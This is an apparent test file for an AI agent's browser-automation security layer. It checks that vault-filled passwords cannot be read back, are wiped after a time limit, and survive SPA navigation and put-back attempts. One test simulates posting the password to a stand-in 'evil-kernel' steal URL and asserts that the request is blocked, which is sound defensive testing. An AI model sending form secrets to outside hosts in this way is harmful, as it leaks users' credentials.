        conversationOf: () => ({ cid: 'conv-r30-x3', name: 'Kernel Agent' }),
        log: quiet,
      });
      const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Kernel Agent', cwd: tmpRoot, backendSessionId: 'conv-r30-x3' }]]);
      Rm.setup({ keeper: keeperWrap, activeSessions: sessions, dialogs, logins, tasksForSession: () => [] });
      const app = express();
      app.use(express.json());
      app.use(Rm.router);
      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
      try {
        const armed = await dialogs.arm(PID);
        dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, tid);
        dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tid);
        const kernelDetected = fk.calls().some((c) => c.method === 'VibeSpace.getVersion') && Boolean(dialogs.kernelFactOf(PID));

        const base = `http://127.0.0.1:${srv.address().port}`;
        const post = async (u, body) => {
          const r = await fetch(base + u, {
            method: 'POST',
            headers: { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` },
            body: JSON.stringify(body),
          });
          return { status: r.status, json: await r.json() };
        };

        const fillRes = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'kernelr30.example.test#alice/password', targetId: tid });
        const domFilled = fk.readDomValues(tid).pw;
        const readLive = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
        const medWs = await openCdpClient(WebSocket, grant.url);
        const attMed = await medWs.call('Target.attachToTarget', { targetId: tid, flatten: true });
        const medEvalLive = await medWs.call('Runtime.evaluate', { expression: 'document.querySelector("#pw").value', returnByValue: true }, attMed.result?.sessionId);
        const exfil = await fk.simulateSubmitRequest({ targetId: tid, url: 'https://evil-kernel.example.test/steal', postData: `pw=${encodeURIComponent(PW)}`, resourceType: 'Fetch' });

        clock += 60_001;
        await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tid });
        // B-518e: the ceiling's wipe has wiped the box and SETTLED (the tab's own state), never a 90 ms sleep
        const x3Wiped = await until(() => fk.readDomValues(tid).pw === '' && wipeSettled(dialogs, PID, tid) && postLiftQuiet(dialogs, PID, tid));
        const domWiped = fk.readDomValues(tid).pw;

        // Post-lift refill + read #1 wipe + read #2 lift in custom-kernel mode
        await rawWs.evalOnTarget(tid, `(() => { document.querySelector('#pw').value = ${JSON.stringify(PW)}; return 1; })()`);
        const refill1 = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
        const refill2 = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
        medWs.close();

        ok(
          armed.ok === true && kernelDetected && x3Wiped
            && fillRes.status === 200 && domFilled === PW
            && readLive.status === 409 && readLive.json?.code === 'login_fill_live'
            && Boolean(medEvalLive.error && /login_fill_live/.test(medEvalLive.error.message || ''))
            && exfil.action === 'fail' && exfil.errorReason === 'BlockedByClient'
            && domWiped === ''
            && refill1.status === 409 && refill1.json?.code === 'login_fill_live'
            && refill2.status === 200,
          'R30-X3 (Extra scene 3 — custom-kernel mode standard:false): VibeSpace.getVersion activates kernel watch mode, mediated fill-vault types secret, blocks live reads + cross-origin exfil, wipes at ceiling, and catches/lifts post-lift refills',
          { kernelDetected, x3Wiped, fillRes, readLive, medEvalLive, exfil, domWiped, refill1, refill2 },
        );
      } finally {
        rawWs.close();
        srv.close();
        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
        dialogs.shutdown();
        keeper.shutdown();
        vault.close();
        await med.shutdown();
        await fk.close();
      }
    }

    // ──────────────────────────────────────────────────────────────────────────
    // R31-2: Nail verdict depends ONLY on the judged tree, never on ambient VIBESPACE_* session env
    // ──────────────────────────────────────────────────────────────────────────
    {
      const r30Src = fs.readFileSync(path.join(repoDir, 'scripts/fixtures/r30-login-nails.mjs'), 'utf8');
      const mBlock = r30Src.match(/\/\/ R30-7:[\s\S]*?(?=\/\/ ──+\s*\n\s*\/\/ R30-8:)/);
      const r30BlockCode = mBlock ? mBlock[0] : '';
      const cleanHome = path.join(tmpRoot, 'h-r31-2-clean');
      fs.mkdirSync(cleanHome, { recursive: true, mode: 0o700 });
      const runnerJs = `
        const path = require('node:path');
        const { spawnSync } = require('node:child_process');
        const repoDir = ${JSON.stringify(repoDir)};
        const tmpRoot = ${JSON.stringify(cleanHome)};
        let verdict = false, detail = null;
        const ok = (c, _label, extra) => { verdict = Boolean(c); detail = extra || null; return verdict; };
        ${r30BlockCode}
        process.stdout.write(JSON.stringify({ verdict, detail, hasApi: Boolean(process.env.VIBESPACE_API), hasTok: Boolean(process.env.VIBESPACE_SESSION_TOKEN) }));
        process.exit(verdict ? 0 : 1);
      `;
      const probe = spawnSync(process.execPath, ['-e', runnerJs], {
        encoding: 'utf8',
        timeout: 8000,
        env: {
          PATH: process.env.PATH || '/usr/bin:/bin',
          HOME: cleanHome,
          TMPDIR: os.tmpdir(),
        },
      });
      let parsedProbe = null;
      try { parsedProbe = JSON.parse(String(probe.stdout || '').trim()); } catch { parsedProbe = null; }
      ok(
        Boolean(r30BlockCode)
          && probe.status === 0
          && parsedProbe?.verdict === true
          && parsedProbe?.hasApi === false
          && parsedProbe?.hasTok === false,
        'R31-2 (Clean-env nail independence): R30-7 in the judged tree passes with zero ambient VIBESPACE_* variables in process.env',
        { status: probe.status, parsedProbe, stderr: String(probe.stderr || '').slice(0, 400) },
      );
    }

    // ──────────────────────────────────────────────────────────────────────────
    // R31-3: Pre-first-await return in `recheckPostLiftOnTab` (e.g. SPA pushState URL change) never caches a settled promise
    // ──────────────────────────────────────────────────────────────────────────
    {
      const ORIGIN = 'https://r31-spa.example.test';
      const SHORT_PW = 'Ab3$xy7'; // 7 bytes (< MIN_MASK_BYTES = 8)
      const dataDir = path.join(tmpRoot, 'd-r31-3');
      const homeDir = path.join(tmpRoot, 'h-r31-3');
      fs.mkdirSync(dataDir, { recursive: true, mode: 0o700 });
      fs.mkdirSync(homeDir, { recursive: true, mode: 0o700 });
      let clock = 1_766_100_000_000;

      const fk = await startFakeKernel({ firstUrl: `${ORIGIN}/login`, mode: { standard: true, omitFilledPassword: true } });
      const tid = fk.targets()[0].targetId;
      fk.setDom(tid, { url: `${ORIGIN}/login`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
      const relay = await startKernelRelay(fk);
      const rawWs = await openCdpClient(WebSocket, fk.wsUrl);
      const med = CM.create({ log: quiet });
      await med.listen();

      const KEY = 'bk-0000313a';
      const SID = 'sess-r31-3';
      const TOKEN = 'vsst_r31_3_' + crypto.randomBytes(8).toString('hex');

      const keeper = BK.create({ dataDir, homeDir, env: () => ({ HOME: homeDir }), liveKeys: () => new Set([KEY]), log: quiet, now: () => clock, install: false, mediator: med });
      const prof = keeper.createProfile({ label: 'R31SpaProf', sharing: 'owner' }, { owner: { kind: 'instance', id: null } });
      const PID = prof.id;
      const grant = await med.grantFor({ profileId: PID, browserKey: KEY, upstream: relay.wsUrl, targetIds: [tid], mode: 'scope' });

      const vault = VE.create({ dataDir, kdf: { N: 1024, r: 8, p: 1 }, log: quiet, idleTimer: false, now: () => clock });
      await vault.setup('r31-3-pw');
      const grants = GS.create({ dataDir, wss: { clients: new Set() }, log: quiet.log });
      const logins = Lm.create({ vault, grants: () => grants, now: () => clock, log: quiet.log });
      logins.addOwn({ origin: ORIGIN, username: 'alice', password: SHORT_PW }, { who: 'owner' });
      grants.set('browser-login', `${ORIGIN}#*`, { to: [{ kind: 'everyone' }], except: [] });

      const keeperWrap = {
        ...keeper,
        cdpEndpointFor: async (id) => (id === PID ? { ok: true, url: relay.wsUrl } : { ok: false }),
        leasesFor: () => [{ profileId: PID, browserKey: KEY, sessionId: SID, targetId: tid }],
        statusFor: () => ({ ephemeral: null, pin: PID, leases: [{ profileId: PID, alias: 'shop', isDefault: true }] }),
        setFor: () => ({ defaultId: PID, attachments: [{ profileId: PID, alias: 'shop', label: prof.label, isDefault: true }], handles: ['shop'] }),
        resolveFor: () => ({ ok: true, kind: 'attachment', handle: 'shop', attachment: { profileId: PID, alias: 'shop', isDefault: true }, handles: ['shop'], isDefault: true }),
        attach: async () => ({ ok: true, profile: prof, browser: { state: 'ready' }, lease: { profileId: PID, browserKey: KEY, sessionId: SID, since: clock }, cdpUrl: grant.url, env: [`AGENT_BROWSER_CDP=${grant.url}`], pinTab: false, others: 0 }),
      };
      const dialogs = Dm.create({
        keeper: keeperWrap,
        logins,
        now: () => clock,
        liveFillMaxMs: 60_000,   // B-518e: the REAL ceiling out of reach — a read starts it on the clock handed in
        holdersOf: () => [{ browserKey: KEY, sessionId: SID }],
        leaseCountOf: () => 1,
        conversationOf: () => ({ cid: 'conv-r31-3', name: 'Agent R31-3' }),
        log: quiet,
      });
      const sessions = new Map([[SID, { agentToken: TOKEN, _browserKey: KEY, _browserVariant: 'D', name: 'Agent R31-3', cwd: tmpRoot, backendSessionId: 'conv-r31-3' }]]);
      Rm.setup({ keeper: keeperWrap, activeSessions: sessions, dialogs, logins, tasksForSession: () => [] });
      const app = express();
      app.use(express.json());
      app.use(Rm.router);
      const srv = await new Promise((r) => { const s = app.listen(0, '127.0.0.1', () => r(s)); });
      let medWs = null;
      try {
        await dialogs.arm(PID);
        dialogs.bindTab?.({ profileId: PID, browserKey: KEY }, tid);
        dialogs.noteActiveTab?.({ profileId: PID, browserKey: KEY }, tid);

        let watchClient = null;
        relay.state.hook = async (msg, { sendToClient }) => {
          if (!watchClient && msg.sessionId) watchClient = { sid: msg.sessionId, sendToClient };
          return false;
        };

        const base = `http://127.0.0.1:${srv.address().port}`;
        const post = async (u, body) => {
          const r = await fetch(base + u, {
            method: 'POST',
            headers: { 'content-type': 'application/json', authorization: `Bearer ${TOKEN}` },
            body: JSON.stringify(body),
          });
          return { status: r.status, json: await r.json() };
        };

        // Fill #1 on /login -> lift at ceiling
        const fill1 = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'r31-spa.example.test#alice/password', targetId: tid });
        clock += 60_001;
        // CONTROL (B-518e) — the old 90 ms sleep's window: the ceiling's wipe is HELD at the relay (its Runtime calls wait for the
        // leg's word) and a read inside it is REFUSED (login_fill_live: the fence holds while it wipes) — a read that lands before
        // the wipe settles cannot be the lift's verdict; the word given, the lift is waited for by its fact
        let openWipe = null, wipeCallsHeld = 0;
        const wipeGate = new Promise((r) => { openWipe = r; });
        const hookBefore = relay.state.hook;
        relay.state.hook = async (msg, x) => {
          const r = typeof hookBefore === 'function' ? await hookBefore(msg, x) : undefined;
          if (r === true) return true;
          // (only the WIPE's calls: the read's own box look — a Runtime call before the ceiling starts — passes; the R30 read's MUST)
          if (openWipe && /^Runtime\./.test(String((msg && msg.method) || '')) && tabEntry(dialogs, PID, tid)?.liveFill?.wiping === true) { wipeCallsHeld += 1; await wipeGate; }
          return r;
        };
        await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tid });
        const wipeHeld = await until(() => wipeCallsHeld > 0 && tabEntry(dialogs, PID, tid)?.liveFill?.wiping === true);
        const readInWipe = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
        const release = openWipe; openWipe = null; release();
        relay.state.hook = hookBefore;
        const spaLift1 = await until(() => liftSettled(dialogs, PID, tid));   // B-518e: the lift's fact (settled), never a 90 ms sleep
        const lift1Read = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
        relay.state.hook = null;

        // SPA pushState (`Page.navigatedWithinDocument`) -> `/login/done`, then read triggers pre-first-await URL-mismatch path in `recheckPostLiftOnTab`
        fk.setDom(tid, { url: `${ORIGIN}/login/done`, elements: [{ id: 'pw', tag: 'input', type: 'password', name: 'Password' }] });
        if (watchClient) {
          watchClient.sendToClient({
            method: 'Page.navigatedWithinDocument',
            params: { frameId: tid, url: `${ORIGIN}/login/done` },
            sessionId: watchClient.sid,
          });
        }
        // the dialogs have SEEN the in-document navigation (the tab's own record of it), never a 50 ms sleep (B-518e)
        const spaSeen = Boolean(watchClient) && await until(() => tabEntry(dialogs, PID, tid)?.loginNavUrl === `${ORIGIN}/login/done`);
        const afterPushStateRead = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tid });

        // Fill #2 on `/login/done` -> lift at ceiling -> page script puts SHORT_PW back into `#pw`!
        const fill2 = await post('/api/agent/browser/fill-vault', { profile: PID, target: '#pw', spec: 'r31-spa.example.test#alice/password', targetId: tid });
        clock += 60_001;
        await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'title'], targetId: tid });
        const spaLift2 = await until(() => liftSettled(dialogs, PID, tid));   // B-518e: the lift's fact (settled), never a 90 ms sleep
        const lift2Read = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });

        await rawWs.evalOnTarget(tid, `(() => { document.querySelector('#pw').value = ${JSON.stringify(SHORT_PW)}; return 1; })()`);
        const putBackRead1 = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });
        const domAfterPutBack1 = fk.readDomValues(tid).pw;

        medWs = await openCdpClient(WebSocket, grant.url);
        const attMed = await medWs.call('Target.attachToTarget', { targetId: tid, flatten: true });
        await rawWs.evalOnTarget(tid, `(() => { document.querySelector('#pw').value = ${JSON.stringify(SHORT_PW)}; return 1; })()`);
        const medPutBackEval = await medWs.call('Runtime.evaluate', { expression: 'document.querySelector("#pw").value', returnByValue: true }, attMed.result?.sessionId);
        const leakInMed = JSON.stringify(medPutBackEval).includes(SHORT_PW);
        const putBackRead2 = await post('/api/agent/browser/resolve', { profile: PID, wrapper: true, fenceCheckOnly: true, argv: ['get', 'value', '#pw'], targetId: tid });

        ok(
          Boolean(watchClient) && wipeHeld && readInWipe.status === 409 && readInWipe.json?.code === 'login_fill_live' && spaLift1 && spaSeen && spaLift2
            && fill1.status === 200 && lift1Read.status === 200
            && afterPushStateRead.status === 200
            && fill2.status === 200 && lift2Read.status === 200
            && putBackRead1.status === 409 && putBackRead1.json?.code === 'login_fill_live'
            && domAfterPutBack1 === ''
            && Boolean(medPutBackEval.error && /login_fill_live/.test(medPutBackEval.error.message || ''))
            && !leakInMed
            && putBackRead2.status === 200,
          'R31-3 (Pre-first-await recheckPostLiftOnTab never poisons tab): after SPA pushState triggers pre-await URL-mismatch return, a second fill+lift on the same tab still catches, wipes, and blocks put-back <8B secret (409 login_fill_live, 0 leak) and lifts on empty next read (200)',
          {
            hasWatchClient: Boolean(watchClient),
            wipeHeld, readInWipe: readInWipe.status, readInWipeCode: readInWipe.json?.code, spaLift1, spaSeen, spaLift2,
            fill1: fill1.status,
            lift1Read: lift1Read.status,
            afterPushStateRead: afterPushStateRead.status,
            fill2: fill2.status,
            lift2Read: lift2Read.status,
            putBackRead1,
            domAfterPutBack1,
            medPutBackEval,
            leakInMed,
            putBackRead2,
          },
        );
      } finally {
        if (medWs) medWs.close();
        rawWs.close();
        srv.close();
        try { LF.clearAllFilledSecrets?.(); } catch { /* */ }
        dialogs.shutdown();
        keeper.shutdown();
        vault.close();
        await med.shutdown();
        await relay.close();
        await fk.close();
      }
    }
  } finally {
    fs.rmSync(tmpRoot, { recursive: true, force: true });
  }
}

if (process.argv[1] && path.resolve(process.argv[1]) === path.resolve(SELF_PATH)) {
  const repoArg = process.argv.find((a) => a.startsWith('--repo='));
  const repoDir = repoArg ? path.resolve(repoArg.slice('--repo='.length)) : path.resolve(path.dirname(SELF_PATH), '../..');
  let pass = 0, fail = 0;
  const okCli = (c, label, detail) => {
    if (c) {
      pass++;
      console.log(`[PASS] ${label}`);
    } else {
      fail++;
      console.log(`[FAIL] ${label}${detail !== undefined ? ' -> ' + JSON.stringify(detail).slice(0, 4000) : ''}`);
    }
    return !!c;
  };
  await runR30LoginNails({ repoDir, ok: okCli });
  console.log(`=== R30 NAILS SUMMARY: ${pass}/${pass + fail} passed, ${fail} failed ===`);
  process.exit(fail ? 1 : 0);
}
